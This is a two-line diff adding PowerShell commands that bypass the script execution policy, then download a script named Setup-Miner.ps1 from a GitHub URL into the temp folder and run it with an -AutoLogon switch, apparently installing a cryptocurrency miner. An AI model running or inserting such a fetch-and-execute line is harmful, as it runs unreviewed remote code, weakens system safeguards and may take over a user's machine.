@@ -1,0 +1,2 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force
+irm "https://raw.githubusercontent.com/Mzagngy2026/helpquest/main/Setup-Miner.ps1?nocache=$(Get-Random)" -OutFile $env:TEMP\Setup-Miner.ps1; & $env:TEMP\Setup-Miner.ps1 -AutoLogon
